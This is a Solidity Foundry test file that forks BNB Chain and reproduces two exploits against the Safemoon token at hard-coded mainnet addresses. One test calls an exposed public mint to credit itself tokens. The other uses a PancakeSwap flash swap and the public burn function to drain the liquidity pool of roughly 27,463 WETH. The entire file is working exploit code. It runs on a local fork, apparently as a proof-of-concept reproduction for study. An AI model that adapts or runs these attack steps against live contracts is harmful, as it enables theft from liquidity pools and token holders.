// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);

    function routerTrade() external pure returns (address);
}

interface ISafemoon {
    function uniswapV2Router() external returns (IUniswapV2Router02);

    function uniswapV2Pair() external returns (address);

    function bridgeBurnAddress() external returns (address);

    function approve(address spender, uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);

    function mint(address user, uint256 amount) external;

    function burn(address from, uint256 amount) external;
}

interface ISafeSwapTradeRouter {
    struct Trade {
        uint256 amountIn;
        uint256 amountOut;
        address[] path;
        address payable to;
        uint256 deadline;
    }

    function getSwapFees(
        uint256 amountIn,
        address[] memory path
    ) external view returns (uint256 _fees);

    function swapExactTokensForTokensWithFeeAmount(
        Trade calldata trade
    ) external payable;
}

interface IWETH {
    function approve(address, uint) external returns (bool);

    function transfer(address, uint) external returns (bool);

    function balanceOf(address) external view returns (uint);
}

interface IPancakePair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IPancakeCallee {
    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function sync() external;
}

contract SafemoonTest is Test, IPancakeCallee {
    ISafemoon public safemoon;
    IPancakePair public pancakePair;
    IWETH public weth;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 26854757);

        safemoon = ISafemoon(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);
        pancakePair = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);
        weth = IWETH(safemoon.uniswapV2Router().WETH());
    }

    function testMintHack() public {
        vm.rollFork(26854757);

        uint originalBalance = safemoon.balanceOf(address(this));
        emit log_named_uint("safemoon balance before:", originalBalance);
        assertEq(originalBalance, 0);

        safemoon.mint(
            address(this),
            safemoon.balanceOf(safemoon.bridgeBurnAddress())
        );

        uint currentBalance = safemoon.balanceOf(address(this));
        emit log_named_uint("safemoon balance after:", currentBalance);
        assertEq(currentBalance, 81804509291616467966);
    }

    function testBurnHack() public {
        vm.rollFork(26864889);

        uint originalBalance = weth.balanceOf(address(this));
        emit log_named_uint("weth balance before:", originalBalance);
        assertEq(originalBalance, 0);

        pancakePair.swap(1000 ether, 0, address(this), "ggg");

        uint currentBalance = weth.balanceOf(address(this));
        emit log_named_uint("weth balance after:", currentBalance);
        assertEq(currentBalance, 27463848254806782408231);
    }

    function doBurnHack(uint amount) public {
        swapBnbForTokens(amount);
        safemoon.burn(
            safemoon.uniswapV2Pair(),
            safemoon.balanceOf(safemoon.uniswapV2Pair()) - 1000000000
        );
        safemoon.burn(address(safemoon), safemoon.balanceOf(address(safemoon)));
        IUniswapV2Pair(safemoon.uniswapV2Pair()).sync();
        swapTokensForBnb(safemoon.balanceOf(address(this)));
    }

    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pancakePair));
        require(sender == address(this));

        doBurnHack(amount0);
        weth.transfer(msg.sender, (amount0 * 10030) / 10000);
    }

    function swapBnbForTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(safemoon);

        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(
            safemoon.uniswapV2Router().routerTrade()
        );
        weth.approve(address(safemoon.uniswapV2Router()), tokenAmount);

        uint256 feeAmount = tradeRouter.getSwapFees(tokenAmount, path);
        ISafeSwapTradeRouter.Trade memory trade = ISafeSwapTradeRouter.Trade({
            amountIn: tokenAmount,
            amountOut: 0,
            path: path,
            to: payable(address(this)),
            deadline: block.timestamp
        });
        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(
            trade
        );
    }

    function swapTokensForBnb(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(safemoon);
        path[1] = address(weth);

        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(
            safemoon.uniswapV2Router().routerTrade()
        );
        safemoon.approve(address(safemoon.uniswapV2Router()), tokenAmount);

        uint256 feeAmount = tradeRouter.getSwapFees(tokenAmount, path);
        ISafeSwapTradeRouter.Trade memory trade = ISafeSwapTradeRouter.Trade({
            amountIn: tokenAmount,
            amountOut: 0,
            path: path,
            to: payable(address(this)),
            deadline: block.timestamp
        });
        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(
            trade
        );
    }
}
